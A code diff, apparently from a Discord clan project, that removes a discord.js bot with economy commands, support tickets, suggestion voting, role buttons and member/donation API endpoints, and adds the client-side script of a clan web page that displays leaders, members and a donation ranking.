  
-// --- RESPUESTA AUTOMÁTICA AL PRIVADO ---
-client.on(Events.MessageCreate, async message => {
-    if (message.author.bot) return;
-    if (message.channel.type === ChannelType.DM) {
-        await message.reply("1fsi its a pro").catch(() => { });
-    }
-});
- 
-client.on(Events.InteractionCreate, async interaction => {
- 
-    if (interaction.isChatInputCommand()) {
-        const { commandName, user, options } = interaction;
-        asegurarUsuario(user.id);
- 
-        const ecoCmds = ['pesca', 'minar', 'trabajar', 'coinflip'];
-        if (ecoCmds.includes(commandName)) {
-            const lastUse = cooldowns.get(`${user.id}-${commandName}`);
-            if (lastUse && Date.now() - lastUse < 60000) {
-                const restante = Math.ceil((60000 - (Date.now() - lastUse)) / 1000);
-                return interaction.reply({ content: `⏳ Espera **${restante}s** para volver a usar este comando.`, flags: [64] });
-            }
-            cooldowns.set(`${user.id}-${commandName}`, Date.now());
+        function switchTab(id, btn) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            btn.classList.add('active');
+            if(window.innerWidth < 1024) toggleMenu();
         }
  
-        if (commandName === 'reclamar' || commandName === 'claim') {
-            if (!interaction.member.roles.cache.has(ROL_STAFF_ID) && !interaction.member.roles.cache.has(ROL_ADICIONAL_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
-            if (!interaction.channel.name.includes('-')) return interaction.reply({ content: "❌ Este no es un canal de ticket.", flags: [64] });
-            staffAtendiendo.set(interaction.channel.id, interaction.user);
-            return interaction.reply({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${interaction.user.tag}** ha reclamado este ticket.`).setColor("#57F287")] });
-        }
+        const API_URL = "https://colmillosdelalba-bot-production.up.railway.app/miembros";
+        let miembrosCache = [];
  
-        if (commandName === 'sugerir') {
-            const modal = new ModalBuilder().setCustomId('modal_sugerencia').setTitle('Nueva Sugerencia');
-            const input = new TextInputBuilder().setCustomId('texto_sugerencia').setLabel("¿Cuál es tu sugerencia?").setStyle(TextInputStyle.Paragraph).setRequired(true);
-            modal.addComponents(new ActionRowBuilder().addComponents(input));
-            return await interaction.showModal(modal);
-        }
- 
-        if (commandName === 'balance') {
-            await interaction.deferReply();
-            const canvas = createCanvas(700, 250);
-            const ctx = canvas.getContext('2d');
- 
-            ctx.fillStyle = '#1e1e1e';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.strokeStyle = '#8B0000';
-            ctx.lineWidth = 10;
-            ctx.strokeRect(0, 0, canvas.width, canvas.height);
- 
-            ctx.font = '35px "Bungee"';
-            ctx.fillStyle = '#ffffff';
-            ctx.fillText(user.username.toUpperCase(), 50, 80);
- 
-            ctx.font = '22px "Bungee"';
-            ctx.fillStyle = '#aaaaaa';
-            ctx.fillText('BALANCE DE ECONOMÍA', 50, 130);
- 
-            ctx.font = '60px "Bungee"';
-            ctx.fillStyle = '#F1C40F';
-            ctx.fillText(`$${db[user.id].balance.toLocaleString()}`, 50, 200);
- 
-            ctx.font = '80px sans-serif';
-            ctx.fillText('💰', 530, 170);
- 
-            const attachment = new AttachmentBuilder(canvas.toBuffer(), { name: 'balance.png' });
-            return interaction.editReply({ files: [attachment] });
-        }
- 
-        if (['pesca', 'minar', 'trabajar', 'daily'].includes(commandName)) {
-            if (commandName === 'daily') {
-                const lastDaily = db[user.id].daily || 0;
-                if (Date.now() - lastDaily < 86400000) {
-                    const resta = Math.ceil((86400000 - (Date.now() - lastDaily)) / 3600000);
-                    return interaction.reply({ content: `⏳ Ya reclamaste hoy. Vuelve en **${resta}h**.`, flags: [64] });
-                }
-                db[user.id].daily = Date.now();
-            }
- 
-            const ganado = Math.floor(Math.random() * 200) + 50;
-            db[user.id].balance += ganado;
-            guardarDB();
-            return interaction.reply(`✅ Has ganado **$${ganado}** usando \`/${commandName}\`.`);
-        }
- 
-        if (commandName === 'top') {
-            const top = Object.entries(db).sort(([, a], [, b]) => b.balance - a.balance).slice(0, 5);
-            const res = top.map(([id, data], i) => `${i + 1}. <@${id}> - $${data.balance}`).join('\n');
-            return interaction.reply(`🏆 **Top Ricos:**\n${res}`);
-        }
- 
-        if (commandName === 'coinflip') {
-            const bet = options.getInteger('apuesta');
-            if (bet > db[user.id].balance) return interaction.reply("No tienes suficiente dinero.");
-            const win = Math.random() > 0.5;
-            db[user.id].balance += win ? bet : -bet;
-            guardarDB();
-            return interaction.reply(win ? `🪙 Ganaste **$${bet}**!` : `🪙 Perdiste **$${bet}**.`);
-        }
-        if (commandName === 'aportacion') {
-            // Bloqueo: Si NO tiene el rol de Staff, el bot lo saca
-            if (!interaction.member.roles.cache.has(ROL_STAFF_ID)) {
-                return interaction.reply({ content: "❌ No tienes permiso. Solo el Staff puede registrar aportaciones.", flags: [64] });
-            }
-            if (!interaction.member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
-            const target = options.getUser('usuario');
-            const monto = options.getInteger('monto');
-            let userDona = donasData.find(d => d.id === target.id);
-            if (userDona) {
-                userDona.cantidad += monto;
-                userDona.username = target.username;
-                userDona.avatar = target.displayAvatarURL();
-            } else {
-                donasData.push({ id: target.id, username: target.username, avatar: target.displayAvatarURL(), cantidad: monto });
-            }
-            donasData.sort((a, b) => b.cantidad - a.cantidad);
-            guardarDonas();
-            return interaction.reply(`✅ Registrados **$${monto.toLocaleString()}** para **${target.username}**.`);
-        }
-    }
- 
-    if (interaction.isModalSubmit() && interaction.customId === 'modal_sugerencia') {
-        await interaction.deferReply({ flags: [64] });
-        const sugerenciaTexto = interaction.fields.getTextInputValue('texto_sugerencia');
-        const canalSugerencias = await client.channels.fetch(CANAL_SUGERENCIAS_ID);
- 
-        const embedSug = new EmbedBuilder()
-            .setAuthor({ name: `📩 NUEVA SUGERENCIA RECIBIDA` })
-            .setThumbnail(interaction.user.displayAvatarURL())
-            .setDescription(`**¿Cuál es tu sugerencia?**\n\`\`\`${sugerenciaTexto}\`\`\``)
-            .addFields(
-                { name: '• Datos', value: `✅ **Votos a favor:** 0\n❗ **Votos en contra:** 0`, inline: false },
-                { name: '\u200B', value: `Recuerda que aunque una sugerencia alcance muchos votos, no siempre se podrán implementar.`, inline: false }
-            )
-            .setFooter({ text: `ID: ${interaction.user.id} | ${new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })}` })
-            .setColor("#F1C40F");
- 
-        const filaVotos = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('sug_si').setLabel('0 (0%)').setEmoji('✅').setStyle(ButtonStyle.Secondary),
-            new ButtonBuilder().setCustomId('sug_no').setLabel('0 (0%)').setEmoji('❗').setStyle(ButtonStyle.Secondary)
-        );
- 
-        const msg = await canalSugerencias.send({ embeds: [embedSug], components: [filaVotos] });
-        const hilo = await msg.startThread({ name: `Debate: Sugerencia de ${interaction.user.username}`, autoArchiveDuration: 1440 });
-        const filaDebate = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Debatir ↗️').setEmoji('💬').setStyle(ButtonStyle.Link).setURL(hilo.url));
- 
-        await msg.edit({ components: [filaVotos, filaDebate] });
-        return await interaction.editReply({ content: `✅ Sugerencia enviada a <#${CANAL_SUGERENCIAS_ID}>` });
-    }
- 
-    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_val_estrellas') {
-        const estrellas = interaction.values[0];
-        const modalVal = new ModalBuilder().setCustomId(`modal_val_${estrellas}`).setTitle('Valoración del Staff');
-        const inputVal = new TextInputBuilder().setCustomId('input_val').setLabel("Comentarios").setStyle(TextInputStyle.Paragraph).setRequired(true);
-        modalVal.addComponents(new ActionRowBuilder().addComponents(inputVal));
-        return await interaction.showModal(modalVal);
-    }
- 
-    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_val_')) {
-        const estrellasNum = interaction.customId.split('_')[2];
-        const comentario = interaction.fields.getTextInputValue('input_val');
-        const staffObj = staffAtendiendo.get(interaction.channel.id) || { username: "No reclamado", id: "N/A" };
- 
-        // --- TRANSCRIPT TXT ---
-        const msgs = await interaction.channel.messages.fetch({ limit: 100 });
-        let content = `Transcript de ${interaction.channel.name}\nAtendido por: ${staffObj.username}\n\n`;
-        msgs.reverse().forEach(m => { content += `[${m.createdAt.toLocaleString()}] ${m.author.tag}: ${m.content}\n`; });
-        const transcriptFile = new AttachmentBuilder(Buffer.from(content), { name: `transcript-${interaction.channel.name}.txt` });
-        const canalTrans = await client.channels.fetch(CANAL_TRANSCRIPTS_ID);
-        await canalTrans.send({ content: `📝 Transcript del ticket **${interaction.channel.name}**`, files: [transcriptFile] });
- 
-        const canalVal = await client.channels.fetch(CANAL_VALORACIONES_ID);
-        const embedVal = new EmbedBuilder()
-            .setAuthor({ name: `• Valoración`, iconURL: interaction.guild.iconURL() })
-            .setDescription(`Ticket valorado por **${interaction.user.username}**`)
-            .setColor("#57F287")
-            .addFields(
-                { name: "➡ Ticket", value: `# \`「🌟」${interaction.channel.name}\`\n(${interaction.channel.id})` },
-                { name: "➡ Panel", value: `Tickets` },
-                { name: "➡ Staff", value: `${staffObj.username} (${staffObj.id})` },
-                { name: "➡ Estrellas", value: "⭐".repeat(parseInt(estrellasNum)) },
-                { name: "➡ Comentarios", value: `${comentario}` }
-            );
- 
-        await canalVal.send({ embeds: [embedVal] });
-        staffAtendiendo.delete(interaction.channel.id);
- 
-        await interaction.reply({ content: "✅ ¡Gracias! Tu valoración ha sido enviada con éxito. El ticket se cerrará en 5 segundos.", flags: [64] });
-        setTimeout(() => interaction.channel.delete().catch(() => { }), 5000);
-        return;
-    }
- 
-    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_tickets') {
-        await interaction.deferReply({ flags: [64] });
-        const ticketTipos = { "tk_soporte": "soporte-dudas", "tk_apelacion": "apelacion", "tk_reporte_staff": "reporte-staff", "tk_postulacion": "postulaciones" };
-        const tipo = ticketTipos[interaction.values[0]];
-        const tChannel = await interaction.guild.channels.create({
-            name: `${tipo}-${interaction.user.username}`,
-            type: ChannelType.GuildText,
-            parent: CATEGORIA_TICKETS,
-            permissionOverwrites: [
-                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
-                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles] },
-                { id: ROL_STAFF_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
-                { id: ROL_ADICIONAL_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
+        const DATA_LIDERES = {
+            supremo: { nick: "guepar_3111", rango: "👑 Líder Principal" },
+            colider: { nick: "nicol3_espin0za", rango: "🥈 Colíder General" },
+            divisiones: [
+                { nick: "teamofurch", rango: "⚒️ Líder Construcción" },
+                { nick: "Jowy19", rango: "📐 Colíder Construcción" },
+                { nick: "postm_alone", rango: "⚔️ Líder PvP" },
+                { nick: "sannvl", rango: "🛡️ Colíder PvP" },
+                { nick: "Otungs", rango: "🛡️ Tester PvP" },
+                { nick: "1fsi.", rango: "🔧 Lider Farmer" },
+                { nick: "Jus.7", rango: "📜 Staff" },
+                { nick: "Hell_8", rango: "📜 Staff" }
             ]
-        });
-        const eTk = new EmbedBuilder().setTitle(`🎫 TICKET: ${tipo.toUpperCase()}`).setDescription(`Hola ${interaction.user}, el Staff te atenderá pronto.`).setColor("#2ECC71");
-        const fTk = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId("reclamar_tk").setLabel("Reclamar").setEmoji("👤").setStyle(ButtonStyle.Success),
-            new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setEmoji("🔒").setStyle(ButtonStyle.Secondary)
-        );
-        await tChannel.send({ content: `<@&${ROL_STAFF_ID}> <@&${ROL_ADICIONAL_ID}>`, embeds: [eTk], components: [fTk] });
-        return interaction.editReply(`✅ Ticket creado: ${tChannel}`);
-    }
+        };
  
-    if (!interaction.isButton()) return;
-    const { customId, member, channel, user } = interaction;
+        async function inicializar() {
+            try {
+                const res = await fetch(`${API_URL}?t=${Date.now()}`);
+                miembrosCache = await res.json();
+                renderJerarquia();
+                filtroTotal('Todos');
+            } catch(e) { console.error(e); }
+        }
  
-    // --- LÓGICA DE ROLES Y SUB-MENÚ CASUAL ---
-    if (customId === "class_estratega") {
-        const filaSubCasual = new ActionRowBuilder().addComponents(
-            Object.entries(SUB_ROLES_CASUAL).map(([id, data]) =>
-                new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Success)
-            )
-        );
-        return interaction.reply({ content: "✨ Has elegido el camino **Casual**. Selecciona tu especialidad:", components: [filaSubCasual], flags: [64] });
-    }
+        function renderJerarquia() {
+            document.getElementById('rank-1').innerHTML = cardLider(DATA_LIDERES.supremo);
+            document.getElementById('rank-2').innerHTML = cardLider(DATA_LIDERES.colider);
+            document.getElementById('rank-3').innerHTML = DATA_LIDERES.divisiones.map(l => cardLider(l)).join('');
+        }
  
-    if (ROLES_CLASE[customId] || SUB_ROLES_CASUAL[customId]) {
-        await interaction.deferReply({ flags: [64] });
+        function cardLider(info) {
+            const user = miembrosCache.find(m => (m.username||"").toLowerCase().includes(info.nick.toLowerCase()));
+            const img = user ? user.avatar : 'https://cdn.discordapp.com/embed/avatars/0.png';
+            return `<div class="leader-box"><span class="rank">${info.rango}</span><img src="${img}"><div style="font-weight:900; font-size:0.8rem; color: #fff;">${user ? (user.nickname || user.username) : info.nick}</div></div>`;
+        }
  
-        const rolData = ROLES_CLASE[customId] || SUB_ROLES_CASUAL[customId];
-        const tieneRol = member.roles.cache.has(rolData.id);
- 
-        try {
-            if (tieneRol) {
-                await member.roles.remove(rolData.id);
-                let nuevoNick = member.displayName;
-                [...Object.values(ROLES_CLASE), ...Object.values(SUB_ROLES_CASUAL)].forEach(r => {
-                    if (r.id !== "MENU_CASUAL") nuevoNick = nuevoNick.replace(`${r.label} | `, "");
-                });
-                if (member.nickname !== nuevoNick) await member.setNickname(nuevoNick === user.username ? null : nuevoNick).catch(() => { });
-                return interaction.editReply(`❌ Rol **${rolData.label}** quitado.`);
-            } else {
-                const todosLosRoles = [...Object.values(ROLES_CLASE), ...Object.values(SUB_ROLES_CASUAL)]
-                    .filter(r => r.id !== "MENU_CASUAL")
-                    .map(r => r.id);
- 
-                for (const id of todosLosRoles) {
-                    if (member.roles.cache.has(id)) await member.roles.remove(id).catch(() => { });
-                }
- 
-                await member.roles.add(rolData.id);
- 
-                let nombreBase = member.displayName;
-                [...Object.values(ROLES_CLASE), ...Object.values(SUB_ROLES_CASUAL)].forEach(r => {
-                    if (r.id !== "MENU_CASUAL") nombreBase = nombreBase.replace(`${r.label} | `, "");
-                });
- 
-                const apodoConRol = `${rolData.label} | ${nombreBase}`;
-                await member.setNickname(apodoConRol.substring(0, 32)).catch(() => { });
- 
-                return interaction.editReply(`✅ Ahora eres **${rolData.label}**.`);
+        function filtroTotal(rolBusqueda, btn) {
+            if(btn) {
+                document.querySelectorAll('.btn-rol').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
             }
-        } catch (e) {
-            console.error(e);
-            return interaction.editReply("❌ Error al gestionar roles.");
+            const grid = document.getElementById('lista-usuarios');
+            const filtrados = rolBusqueda === 'Todos' 
+                ? miembrosCache 
+                : miembrosCache.filter(u => u.roles && u.roles.some(r => r.includes(rolBusqueda) || r.toLowerCase().includes(rolBusqueda.toLowerCase())));
+ 
+            grid.innerHTML = filtrados.map(u => `
+                <div class="card">
+                    <img src="${u.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png'}">
+                    <div style="font-weight:900; font-size:0.8rem; color: #ddd;">${u.nickname || u.username}</div>
+                </div>
+            `).join('');
         }
-    }
+        let tiempoRestante = 300; 
+        const API_DONACIONES = "https://colmillosdelalba-bot-production.up.railway.app/donaciones";
  
-    if (customId === 'sug_si' || customId === 'sug_no') {
-        await interaction.deferUpdate();
-        const msgId = interaction.message.id;
-        const userId = interaction.user.id;
-        if (!votos.has(msgId)) votos.set(msgId, new Map());
-        const votosMsg = votos.get(msgId);
-        let vSi = parseInt(interaction.message.components[0].components[0].label.split(' ')[0]);
-        let vNo = parseInt(interaction.message.components[0].components[1].label.split(' ')[0]);
-        const votoAnterior = votosMsg.get(userId);
-        if (votoAnterior === customId) return;
-        if (votoAnterior === 'sug_si') vSi--;
-        if (votoAnterior === 'sug_no') vNo--;
-        if (customId === 'sug_si') vSi++;
-        else vNo++;
-        votosMsg.set(userId, customId);
-        const total = vSi + vNo;
-        const pSi = Math.round((vSi / (total || 1)) * 100);
-        const pNo = Math.round((vNo / (total || 1)) * 100);
-        const embed = interaction.message.embeds[0];
-        const nEmbed = EmbedBuilder.from(embed).setFields(
-            { name: '• Datos', value: `✅ **Votos a favor:** ${vSi}\n❗ **Votos en contra:** ${vNo}`, inline: false },
-            { name: '\u200B', value: embed.fields[1].value, inline: false }
-        );
-        const nFila = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('sug_si').setLabel(`${vSi} (${pSi}%)`).setEmoji('✅').setStyle(ButtonStyle.Secondary),
-            new ButtonBuilder().setCustomId('sug_no').setLabel(`${vNo} (${pNo}%)`).setEmoji('❗').setStyle(ButtonStyle.Secondary)
-        );
-        return await interaction.message.edit({ embeds: [nEmbed], components: [nFila, interaction.message.components[1]] });
-    }
- 
-    if (ROLES_NOTIF[customId]) {
-        await interaction.deferReply({ flags: [64] });
-        const rId = ROLES_NOTIF[customId].id;
-        if (member.roles.cache.has(rId)) {
-            await member.roles.remove(rId);
-            return interaction.editReply(`❌ Rol de notificación **${ROLES_NOTIF[customId].label}** quitado.`);
-        } else {
-            await member.roles.add(rId);
-            return interaction.editReply(`✅ Rol de notificación **${ROLES_NOTIF[customId].label}** añadido.`);
+        function iniciarContador() {
+            setInterval(() => {
+                tiempoRestante--;
+                if (tiempoRestante <= 0) {
+                    tiempoRestante = 300;
+                    cargarDonaciones();
+                }
+                let m = Math.floor(tiempoRestante / 60);
+                let s = tiempoRestante % 60;
+                document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            }, 1000);
         }
-    }
  
-    if (customId === "reclamar_tk") {
-        if (!member.roles.cache.has(ROL_STAFF_ID) && !member.roles.cache.has(ROL_ADICIONAL_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
-        staffAtendiendo.set(channel.id, user);
-        await interaction.update({ components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("reclamado").setLabel("Atendido por " + user.username).setStyle(ButtonStyle.Success).setDisabled(true), new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setStyle(ButtonStyle.Secondary))] });
-        return channel.send({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${user.tag}** se hará cargo.`).setColor("#57F287")] });
-    }
- 
-    if (customId === "cerrar_tk") {
-        if (!member.roles.cache.has(ROL_STAFF_ID) && !member.roles.cache.has(ROL_ADICIONAL_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
-        const overwrite = channel.permissionOverwrites.cache.find(o => o.type === 1 && o.id !== ROL_STAFF_ID && o.id !== ROL_ADICIONAL_ID && o.id !== interaction.guild.id);
-        const ownerId = overwrite ? overwrite.id : null;
-        await interaction.reply("🔒 Cerrando ticket...");
-        if (ownerId) {
-            const btnVal = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`abrir_val_${ownerId}`).setLabel("Valorar atención (⭐)").setStyle(ButtonStyle.Primary));
-            await channel.send({ content: `<@${ownerId}>, por favor ayuda al staff dándoles una valoración:`, components: [btnVal] });
+        async function cargarDonaciones() {
+            try {
+                const respuesta = await fetch(`${API_DONACIONES}?t=${Date.now()}`);
+                const lista = await respuesta.json();
+                dibujarDonadores(lista);
+            } catch (e) { console.log("Error al obtener donaciones."); }
         }
-        setTimeout(() => channel.delete().catch(() => { }), 60000);
-    }
  
-    if (customId.startsWith("abrir_val_")) {
-        const ownerId = customId.split('_')[2];
-        if (interaction.user.id !== ownerId) return;
-        const menuVal = new StringSelectMenuBuilder().setCustomId('menu_val_estrellas').setPlaceholder('¿Cuántas estrellas nos das?').addOptions(
-            { label: '⭐⭐⭐⭐⭐ (5)', value: '5' },
-            { label: '⭐⭐⭐⭐ (4)', value: '4' },
-            { label: '⭐⭐⭐ (3)', value: '3' },
-            { label: '⭐⭐ (2)', value: '2' },
-            { label: '⭐ (1)', value: '1' }
-        );
-        return interaction.reply({ content: "Selecciona tu puntuación:", components: [new ActionRowBuilder().addComponents(menuVal)], flags: [64] });
-    }
-});
+        function dibujarDonadores(datos) {
+            const podio = document.getElementById('podium-area');
+            const tabla = document.getElementById('list-area');
+            podio.innerHTML = ''; tabla.innerHTML = '';
+            datos.forEach((user, i) => {
+                if(i < 3) {
+                    const iconos = ['👑', '🥈', '🥉'];
+                    podio.innerHTML += `<div class="podium-item rank-${i+1}"><div class="crown">${iconos[i]}</div><img src="${user.avatar}"><div style="font-weight:900">${user.username}</div><span class="money">$${user.cantidad.toLocaleString()}</span></div>`;
+                } else {
+                    tabla.innerHTML += `<div class="donor-row"><span>#${i+1} <b>${user.username}</b></span><span style="color:#00ff88; font-weight:bold">$${user.cantidad.toLocaleString()}</span></div>`;
+                }
+            });
+        }
  
-// --- ENDPOINT PARA LA WEB DEL CLAN ---
-app.get('/miembros', async (req, res) => {
-    try {
-        const guild = await client.guilds.fetch("1459675438543540399"); // ID de tu servidor
-        const members = await guild.members.fetch();
+        inicializar();
+        iniciarContador();
+        cargarDonaciones();
+    </script>
  
-        // Mapeamos los datos necesarios para las tarjetas de la web
-        const data = members.map(m => ({
-            username: m.user.username,
-            avatar: m.user.displayAvatarURL({ extension: 'png', size: 256 }),
-            // Filtramos solo los nombres de los roles que mencionamos en la web
-            roles: m.roles.cache.map(r => r.name.toUpperCase()) 
-        }));
+</body>
+</html>
  
-        res.json(data);
-    } catch (error) {
-        console.error("Error al obtener miembros:", error);
-        res.status(500).json({ error: "No se pudieron obtener los miembros" });
-    }
-});
-// NUEVO: Ranking de donaciones para la web
-app.get('/donaciones', (req, res) => {
-    res.json(donasData.slice(0, 10)); // Envía los mejores 10
-});
- 
-// Railway usará el puerto que él decida, o el 3000 por defecto
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🌐 API Web escuchando en el puerto ${PORT}`);
-});
-client.login(TOKEN);
